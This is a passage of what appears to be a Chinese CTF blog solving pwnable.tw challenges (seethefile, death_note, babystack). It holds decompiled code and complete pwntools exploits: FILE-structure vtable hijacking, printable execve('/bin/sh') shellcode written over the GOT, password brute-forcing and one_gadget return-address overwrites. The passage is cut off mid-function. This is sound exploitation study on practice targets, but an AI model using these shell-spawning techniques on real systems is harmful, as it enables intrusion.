源码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">/* Write formatted output to stdout from the format string FORMAT.  */</span><br><span class="line">int</span><br><span class="line">___printf_chk (int flag, const char *format, ...)</span><br><span class="line">&#123;</span><br><span class="line">  va_list ap;</span><br><span class="line">  int done;</span><br><span class="line"></span><br><span class="line">  _IO_acquire_lock_clear_flags2 (stdout);</span><br><span class="line">  if (flag &gt; 0)</span><br><span class="line">    stdout-&gt;_flags2 |= _IO_FLAGS2_FORTIFY;</span><br><span class="line"></span><br><span class="line">  va_start (ap, format);</span><br><span class="line">  done = vfprintf (stdout, format, ap);</span><br><span class="line">  va_end (ap);</span><br><span class="line"></span><br><span class="line">  if (flag &gt; 0)</span><br><span class="line">    stdout-&gt;_flags2 &amp;= ~_IO_FLAGS2_FORTIFY;</span><br><span class="line">  _IO_release_lock (stdout);</span><br><span class="line"></span><br><span class="line">  return done;</span><br><span class="line">&#125;</span><br><span class="line">ldbl_strong_alias (___printf_chk, __printf_chk)</span><br></pre></td></tr></table></figure><p>printf_chk 格式化字符串漏洞。。。神奇、、</p><h1 id="seethefile"><a href="#seethefile" class="headerlink" title="seethefile"></a>seethefile</h1><p>第一次见FILE题，学习一下</p><h2 id="题目-8"><a href="#题目-8" class="headerlink" title="题目"></a>题目</h2><p>功能</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">int menu()</span><br><span class="line">&#123;</span><br><span class="line">  puts(&quot;---------------MENU---------------&quot;);</span><br><span class="line">  puts(&quot;  1. Open&quot;);</span><br><span class="line">  puts(&quot;  2. Read&quot;);</span><br><span class="line">  puts(&quot;  3. Write to screen&quot;);</span><br><span class="line">  puts(&quot;  4. Close&quot;);</span><br><span class="line">  puts(&quot;  5. Exit&quot;);</span><br><span class="line">  puts(&quot;----------------------------------&quot;);</span><br><span class="line">  return printf(&quot;Your choice :&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>open打开文件，read读入0x18f的数据，如果文件名或读入的数据中没有‘flag’ 或 ‘FLAG’，就能够write到屏幕上，close关闭文件，exit时让输入姓名，会溢出。</p><h2 id="分析-8"><a href="#分析-8" class="headerlink" title="分析"></a>分析</h2><p>后面给了一个明显的溢出，也就是我们的切入点，gdb调试发现name在bss段，后面只有一个指向文件的fp指针，意图很明显。<br>我们可以先读取/map/self/maps 来获取程序的段信息，虽然能读入的信息较少，但是足以获得heap基地址以用来得到libc基地址。<br>至于fp指针，需要将其覆盖并继续溢出伪造一个FILE结构体，fp指针就是指向这个结构体以避免程序错误退出，同时将伪造的虚表上的vtable该为system，fclose即可即可调用system。</p><h2 id="exp-7"><a href="#exp-7" class="headerlink" title="exp"></a>exp</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context.log_level = &apos;debug&apos;</span><br><span class="line">#sh = process(&apos;./seethefile&apos;)</span><br><span class="line">sh = remote(&apos;chall.pwnable.tw&apos;, 10200)</span><br><span class="line">elf = ELF(&apos;./seethefile&apos;)</span><br><span class="line">libc = ELF(&apos;./libc_32.so.6&apos;)</span><br><span class="line">def open(name):</span><br><span class="line">sh.recvuntil(&apos;Your choice :&apos;)</span><br><span class="line">sh.sendline(&apos;1&apos;)</span><br><span class="line">sh.recvuntil(&apos;see :&apos;)</span><br><span class="line">sh.sendline(name)</span><br><span class="line"></span><br><span class="line">def read():</span><br><span class="line">sh.recvuntil(&apos;Your choice :&apos;)</span><br><span class="line">sh.sendline(&apos;2&apos;)</span><br><span class="line"></span><br><span class="line">def write():</span><br><span class="line">sh.recvuntil(&apos;Your choice :&apos;)</span><br><span class="line">sh.sendline(&apos;3&apos;)</span><br><span class="line"></span><br><span class="line">def close():</span><br><span class="line">sh.recvuntil(&apos;Your choice :&apos;)</span><br><span class="line">sh.sendline(&apos;4&apos;)</span><br><span class="line"></span><br><span class="line">def exit(con):</span><br><span class="line">sh.recvuntil(&apos;Your choice :&apos;)</span><br><span class="line">sh.sendline(&apos;5&apos;)</span><br><span class="line">sh.recvuntil(&apos;Leave your name :&apos;)</span><br><span class="line">sh.sendline(con)</span><br><span class="line"></span><br><span class="line">open(&apos;/proc/self/maps&apos;)</span><br><span class="line">read()</span><br><span class="line">write()</span><br><span class="line"></span><br><span class="line">sh.recvline()</span><br><span class="line">sh.recvline()</span><br><span class="line">sh.recvline()</span><br><span class="line">heap = int(sh.recvline()[:8],16)</span><br><span class="line">success(&apos;heap: &apos;+hex(heap))</span><br><span class="line">libc.address = int(sh.recvline()[:8],16)+0x1000</span><br><span class="line">success(&apos;libc_base: &apos;+hex(libc.address))</span><br><span class="line">system = libc.symbols[&apos;system&apos;]</span><br><span class="line">close()</span><br><span class="line"></span><br><span class="line">pay = &apos;\x00&apos;*32 + p32(0x0804B300)</span><br><span class="line">pay+=&apos;\x00&apos;*(0x80-4)</span><br><span class="line">file = &apos;\xff\xff\xff\xff;$0\x00&apos;.ljust(0x48,&apos;\x00&apos;)</span><br><span class="line">file = file.ljust(0x94,&apos;\x00&apos;)  //在 libc2.23 版本下，32 位的 vtable 偏移为 0x94，64 位偏移为 0xd8;</span><br><span class="line">pay+=file</span><br><span class="line">pay+=p32(0x0804B300+0x98)</span><br><span class="line">pay+=p32(system)*21#vtable</span><br><span class="line">exit(pay)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><h1 id="death-note"><a href="#death-note" class="headerlink" title="death_note"></a>death_note</h1><p><em>话说这边的题难度真是飘忽不定。。</em></p><h2 id="题目-9"><a href="#题目-9" class="headerlink" title="题目"></a>题目</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">int menu()</span><br><span class="line">&#123;</span><br><span class="line">  puts(&quot;-----------------------------------&quot;);</span><br><span class="line">  puts(&quot;             DeathNote             &quot;);</span><br><span class="line">  puts(&quot;-----------------------------------&quot;);</span><br><span class="line">  puts(&quot; 1. Add a name                     &quot;);</span><br><span class="line">  puts(&quot; 2. show a name on the note        &quot;);</span><br><span class="line">  puts(&quot; 3. delete a name int the note     &quot;);</span><br><span class="line">  puts(&quot; 4. Exit                           &quot;);</span><br><span class="line">  puts(&quot;-----------------------------------&quot;);</span><br><span class="line">  return printf(&quot;Your choice :&quot;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"># checksec death_note</span><br><span class="line">[*] &apos;/root/pwnable/death_note1/death_note&apos;</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX disabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br><span class="line">    RWX:      Has RWX segments</span><br></pre></td></tr></table></figure><h2 id="分析-9"><a href="#分析-9" class="headerlink" title="分析"></a>分析</h2><p>题目的功能就是menu上的那样，不过在里面add的时候，index是自己选的，而且没有任何限制， 所以是有希望随便输入负数，将name也就是我们要输入的shellcode往上覆盖到got表来get shell。</p><p>输入的内容会进行检查，必须是可打印字符且最长为0x50，所以shellcode也需要在限制条件之内。<br>shellcode可以使用metasploit自带的msfvenom来生成。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="exp-8"><a href="#exp-8" class="headerlink" title="exp"></a>exp</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">sh = process(&apos;./death_note&apos;)</span><br><span class="line">sh = remote(&apos;chall.pwnable.tw&apos;, 10201)</span><br><span class="line"></span><br><span class="line">def add(idx,con):</span><br><span class="line">sh.sendline(&apos;1&apos;)</span><br><span class="line">sh.recvuntil(&apos;Index :&apos;)</span><br><span class="line">sh.sendline(str(idx))</span><br><span class="line">sh.recvuntil(&apos;Name :&apos;)</span><br><span class="line">sh.sendline(con)</span><br><span class="line"></span><br><span class="line">def dele(idx):</span><br><span class="line">sh.sendline(&apos;3&apos;)</span><br><span class="line">sh.recvuntil(&apos;Index :&apos;)</span><br><span class="line">sh.sendline(str(idx))</span><br><span class="line"></span><br><span class="line">pay = asm(&apos;&apos;&apos;</span><br><span class="line">/* execve(&apos;/bin///sh&apos;,0,0)*/</span><br><span class="line"></span><br><span class="line">push 0x68</span><br><span class="line">push 0x732f2f2f</span><br><span class="line">push 0x6e69622f</span><br><span class="line"></span><br><span class="line">push esp</span><br><span class="line">pop ebx /*set ebx to &apos;/bin///sh&apos;*/</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">push edx</span><br><span class="line">dec edx</span><br><span class="line">dec edx /*set dl to 0xfe*/</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">xor [eax+32],dl /*decode int 0x80*/</span><br><span class="line">xor [eax+33],dl /*decode int 0x80*/</span><br><span class="line"></span><br><span class="line">inc edx</span><br><span class="line">inc edx /*recover edx to 0*/</span><br><span class="line"></span><br><span class="line">push edx</span><br><span class="line">pop ecx /*set ecx to 0*/</span><br><span class="line"></span><br><span class="line">push 0x40</span><br><span class="line">pop eax</span><br><span class="line">xor al,0x4b /*set eax to 0xb*/</span><br><span class="line"></span><br><span class="line">/*int 0x80*/</span><br><span class="line">&apos;&apos;&apos;)+&apos;\x33\x7e&apos;</span><br><span class="line"></span><br><span class="line">add(-19,pay)</span><br><span class="line">dele(-19)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><h1 id="babystack"><a href="#babystack" class="headerlink" title="babystack"></a>babystack</h1><p><em>终于有时间继续做了、、</em></p><h2 id="题目-10"><a href="#题目-10" class="headerlink" title="题目"></a>题目</h2><p>保护全开。。。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall main(__int64 a1, char **a2, char **a3)</span><br><span class="line">&#123;</span><br><span class="line">  _QWORD *v3; // rcx</span><br><span class="line">  __int64 v4; // rdx</span><br><span class="line">  char des; // [rsp+0h] [rbp-60h]</span><br><span class="line">  __int64 buf; // [rsp+40h] [rbp-20h]</span><br><span class="line">  __int64 v8; // [rsp+48h] [rbp-18h]</span><br><span class="line">  char v9; // [rsp+50h] [rbp-10h]</span><br><span class="line"></span><br><span class="line">  mmap_for_proc();</span><br><span class="line">  files[0] = open(&quot;/dev/urandom&quot;, 0);</span><br><span class="line">  read(files[0], &amp;buf, 0x10uLL);</span><br><span class="line">  v3 = IsMmap_ptr;</span><br><span class="line">  v4 = v8;</span><br><span class="line">  *IsMmap_ptr = buf;</span><br><span class="line">  v3[1] = v4;</span><br><span class="line">  close(files[0]);                              </span><br><span class="line">                                                 </span><br><span class="line">                                                 </span><br><span class="line">                                                 </span><br><span class="line">  while ( 1 )</span><br><span class="line">  &#123;</span><br><span class="line">    write(1, &quot;&gt;&gt; &quot;, 3uLL);</span><br><span class="line">    _read_chk(0LL, &amp;v9, 0x10LL, 0x10LL);</span><br><span class="line">    if ( v9 == &apos;2&apos; )</span><br><span class="line">      break;</span><br><span class="line">    if ( v9 == &apos;3&apos; )</span><br><span class="line">    &#123;</span><br><span class="line">      if ( password_inuse )</span><br><span class="line">        read_to_des(&amp;des);</span><br><span class="line">      else</span><br><span class="line">        puts(&quot;Invalid choice&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    else if ( v9 == &apos;1&apos; )</span><br><span class="line">    &#123;</span><br><span class="line">      if ( password_inuse )</span><br><span class="line">        password_inuse = 0;</span><br><span class="line">      else</span><br><span class="line">        login(&amp;buf);</span><br><span class="line">    &#125;</span><br><span class="line">    else</span><br><span class="line">    &#123;</span><br><span class="line">      puts(&quot;Invalid choice&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  if ( !password_inuse )</span><br><span class="line">    exit(0);</span><br><span class="line">  if ( memcmp(&amp;buf, IsMmap_ptr, 0x10uLL) )</span><br><span class="line">    JUMPOUT(loc_100B);</span><br><span class="line">  return 0LL;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int __fastcall login(const char *buf)</span><br><span class="line">&#123;</span><br><span class="line">  size_t len; // rax</span><br><span class="line">  char s; // [rsp+10h] [rbp-80h]</span><br><span class="line"></span><br><span class="line">  printf(&quot;Your passowrd :&quot;);</span><br><span class="line">  read_int(&amp;s, 0x7Fu);</span><br><span class="line">  len = strlen(&amp;s);</span><br><span class="line">  if ( strncmp(&amp;s, buf, len) )</span><br><span class="line">    return puts(&quot;Failed !&quot;);</span><br><span class="line">  password_inuse = 1;</span><br><span class="line">  return puts(&quot;Login Success !&quot;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int __fastcall read_to_des(char *des)</span><br><span class="line">&#123;</span><br><span class="line">  char src; // [rsp+10h] [rbp-80h]</span><br><span class="line"></span><br><span class="line">  printf(&quot;Copy :&quot;);</span><br><span class="line">  read_int(&amp;src, 0x3Fu);</span><br><span class="line">  strcpy(des, &amp;src);</span><br><span class="line">  return puts(&quot;It is magic copy !&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h2 id="分析-10"><a href="#分析-10" class="headerlink" title="分析"></a>分析</h2><p>main函数刚开始随机得到0x10个字节的数据并将其复制到buf处，并将全局变量指针*IsMmap_ptr指向该内存。<br>read_chk读入参数，1-login(与随机得到的0x10个字节进行比较输入字节长度len的密码是否正确)或清除密码标志位密码，2-退出，3-检查密码标志位，为1则可读入0x3f字节的数据复制到des处</p><p>问题：</p><ol><li>login时可以不输入密码，直接回车可以跳过判定；或者以/x00开头跳过判定；或者可以依次爆破得到随机数password。</li><li>strcpy将src处的值复制到des，靠的是识别末尾处的/x00截断，而read_int并不会自动给加上/x00，因为输入字节的限制，看上去感觉并不会溢出，但是因为login函数用的是同一个栈段，所以有希望在src[0x3f]处将其置为非/x00，这样strcpy便会产生溢出。</li><li>为了getshell，rop不太可能–canary的存在，使得可能爆破出来的canary在最后会有/x00截断，这样strcpy就没法溢出到返回地址处了。所以应该要使用Onegadget一发入魂，但是libc地址搞不出来。。。。</li></ol><p>得到大佬的思路：strcpy后原来的buf处变为两个libc中的地址，将其泄露计算libc基地址即可（ps：这一步仍有问题）</p><h2 id="exp-9"><a href="#exp-9" class="headerlink" title="exp"></a>exp</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line"># one_gadget ./libc_64.so.6 </span><br><span class="line">0x45216execve(&quot;/bin/sh&quot;, rsp+0x30, environ)</span><br><span class="line">constraints:</span><br><span class="line">  rax == NULL</span><br><span class="line"></span><br><span class="line">0x4526aexecve(&quot;/bin/sh&quot;, rsp+0x30, environ)</span><br><span class="line">constraints:</span><br><span class="line">  [rsp+0x30] == NULL</span><br><span class="line"></span><br><span class="line">0xef6c4execve(&quot;/bin/sh&quot;, rsp+0x50, environ)</span><br><span class="line">constraints:</span><br><span class="line">  [rsp+0x50] == NULL</span><br><span class="line"></span><br><span class="line">0xf0567execve(&quot;/bin/sh&quot;, rsp+0x70, environ)</span><br><span class="line">constraints:</span><br><span class="line">  [rsp+0x70] == NULL</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">from pwn import *</span><br><span class="line">context.log_level = &apos;debug&apos;</span><br><span class="line">sh = process(&apos;./babystack&apos;)</span><br><span class="line">libc = ELF(&apos;./libc_64.so.6&apos;)</span><br><span class="line">bin = ELF(&apos;./babystack&apos;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">one_gadget_offset = 0x45216</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def copy():</span><br><span class="line">    sh.recvuntil(&apos;&gt;&gt; &apos;)</span><br><span class="line">    sh.sendline(&apos;3&apos;)</span><br><span class="line">    sh.recvuntil(&apos;Copy :&apos;)</span><br><span class="line">    sh.send(s)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def login(pwd,lo=1):</span><br><span class="line">    if lo:</span><br><span class="line">        sh.send(&apos;1&apos;+&apos;a&apos;*15)</span><br><span class="line">    else:</span><br><span class="line">        sh.send(&apos;1&apos;)</span><br><span class="line">    sh.recvuntil(&apos;Your passowrd :&apos;)</span><br><span class="line">    sh.send(pwd)</span><br><span class="line">    return sh.recvuntil(&apos;&gt;&gt; &apos;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def guess(length,secret=&apos;&apos;):</span><br><span class="line">    for i in range(length):</span><br><span class="line">        for q in range(1,256):</span><br><span class="line">            if &apos;Success&apos; in login(secret+chr(q)+&apos;\n&apos;,False):</span><br><span class="line">                secret+=chr(q)</span><br><span class="line">                sh.sendline(&apos;1&apos;)</span><br><span class="line">                sh.recvuntil(&apos;&gt;&gt; &apos;)</span><br><span class="line">                break</span><br><span class="line">    return secret</span><br><span class="line"></span><br><span class="line">def logout():</span><br><span class="line">    sh.sendline(&apos;1&apos;)</span><br><span class="line">    sh.recvuntil(&apos;&gt;&gt; &apos;)</span><br><span class="line"></span><br><span class="line"># 爆破随机数</span><br><span class="line">secret = guess(16)</span><br><span class="line"></span><br><span class="line"># 绕过login，将src[0x3f]设置为非0，并将随机数位置变为libc的地址</span><br><span class="line">login(&apos;\x00&apos;+&apos;a&apos;*0x57)</span><br><span class="line">copy(&apos;a&apos;*0x40)</span><br><span class="line">logout()</span><br><span class="line"></span><br><span class="line"># strcpy溢出泄露buf位置的libc</span><br><span class="line">base = u64(guess(6,&apos;a&apos;*16+&apos;1&apos;+&apos;a&apos;*7)[24:]+&apos;\x00\x00&apos;)-324-libc.symbols[&apos;setvbuf&apos;]        //泄漏的位置有点诡异。。。</span><br><span class="line"></span><br><span class="line">one_gadget_addr = one_gadget_offset + base</span><br><span class="line"></span><br><span class="line">## 覆盖返回地址到one_gadget_addr 得到shell</span><br><span class="line">pay = &apos;\x00&apos; + &apos;a&apos; * 0x3f + secret + &apos;a&apos; *0x18 + p64(one_gadget_addr)</span><br><span class="line"></span><br><span class="line">login(pay)</span><br><span class="line">copy(&apos;a&apos;*0x40)</span><br><span class="line">sh.sendline(&apos;2&apos;)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><h1 id="spirited-away"><a href="#spirited-away" class="headerlink" title="spirited_away"></a>spirited_away</h1><p><em>比较简短的一个程序，不过好久没看题了。。考试实习忙的一批</em></p><h2 id="题目-11"><a href="#题目-11" class="headerlink" title="题目"></a>题目</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line">int survey()</span><br><span class="line">&#123;</span><br><span class="line">  char v1; // [esp+10h] [ebp-E8h]</span><br><span class="line">  size_t nbytes; // [esp+48h] [ebp-B0h]</span><br><span class="line">  size_t v3; // [esp+4Ch] [ebp-ACh]</span><br><span class="line">  char s; // [esp+50h] [ebp-A8h]</span><br><span class="line">  int age; // [esp+A0h] [ebp-58h]</span><br><span class="line">  void *name; // [esp+A4h] [ebp-54h]</span><br><span class="line">  int reason; // [esp+A8h] [ebp-50h]</span><br><span class="line"></span><br><span class="line">  nbytes = 0x3C;</span><br><span class="line">  v3 = 0x50;</span><br><span class="line">LABEL_2:</span><br><span class="line">  memset(&amp;s, 0, 0x50u);</span><br><span class="line">  name = malloc(0x3Cu);</span><br><span class="line">  printf(&quot;\nPlease enter your name: &quot;);</span><br><span class="line">  fflush(stdout);</span><br><span class="line">  read(0, name, nbytes);</span><br><span class="line">  printf(&quot;Please enter your age: &quot;);</span><br><span class="line">  fflush(stdout);</span><br><span class="line">  __isoc99_scanf(&quot;%d&quot;, &amp;age);</span><br><span class="line">  printf(&quot;Why did you came to see this movie? &quot;);</span><br><span class="line">  fflush(stdout);</span><br><span class="line">  read(0, &amp;reason, v3);</span><br><span class="line">  fflush(stdout);</span><br><span class="line">  printf(&quot;Please enter your comment: &quot;);</span><br><span class="line">  fflush(stdout);</span><br><span class="line">  read(0, &amp;s, nbytes);</span><br><span class="line">  ++cnt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  printf(&quot;Name: %s\n&quot;, name);</span><br><span class="line">  printf(&quot;Age: %d\n&quot;, age);</span><br><span class="line">  printf(&quot;Reason: %s\n&quot;, &amp;reason);          //leak</span><br><span class="line">  printf(&quot;Comment: %s\n\n&quot;, &amp;s);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  fflush(stdout);</span><br><span class="line">  sprintf(&amp;v1, &quot;%d comment so far. We will review them as soon as we can&quot;, cnt);</span><br><span class="line">  puts(&amp;v1);</span><br><span class="line">  puts(&amp;::s);</span><br><span class="line">  fflush(stdout);</span><br><span class="line">  if ( cnt &gt; 199 )</span><br><span class="line">  &#123;</span><br><span class="line">    puts(&quot;200 comments is enough!&quot;);</span><br><span class="line">    fflush(stdout);</span><br><span class="line">    exit(0);</span><br><span class="line">  &#125;</span><br><span class="line">  while ( 1 )</span><br><span class="line">  &#123;</span><br><span class="line">    printf(&quot;Would you like to leave another comment? &lt;y/n&gt;: &quot;);</span><br><span class="line">    fflush(stdout);</span><br><span class="line">    read(0, &amp;choice, 3u);</span><br><span class="line">    if ( 